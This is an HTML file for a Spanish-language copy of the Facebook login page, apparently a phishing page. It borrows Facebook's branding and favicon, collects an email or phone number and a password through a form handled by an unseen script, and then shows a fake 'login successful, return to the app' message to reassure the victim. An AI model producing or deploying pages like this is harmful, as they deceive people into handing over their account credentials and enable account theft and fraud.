<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Inicia sesión o regístrate</title>
    <link rel="stylesheet" href="styleFace.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@700&display=swap" rel="stylesheet">
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hH0vTqV-y_J.ico" type="image/x-icon">
</head>
<body>

    <div id="success-message">
        Inicio de sesion exitoso, vuelva a la app para continuar
    </div>

    <div class="container">
        <div class="left-side">
            <h1 class="logo">facebook</h1>
            <p class="description">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
        </div>

        <div class="right-side">
            <div class="login-box">
                <form id="loginForm">
                    <input type="text" placeholder="Correo electrónico o número de teléfono" name="email" required> 
                    <input type="password" placeholder="Contraseña" name="password" required>
                    <button type="submit" class="btn-login">Iniciar sesión</button>
                </form>
                <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
                <hr>
                <button class="btn-new-account">Crear cuenta nueva</button>
            </div>
            <p class="create-page">
                <a href="#">Crea una página</a> para una celebridad, una marca o un negocio.
            </p>
        </div>
    </div>

    <script src="scriptFace.js"></script>
</body>
</html>
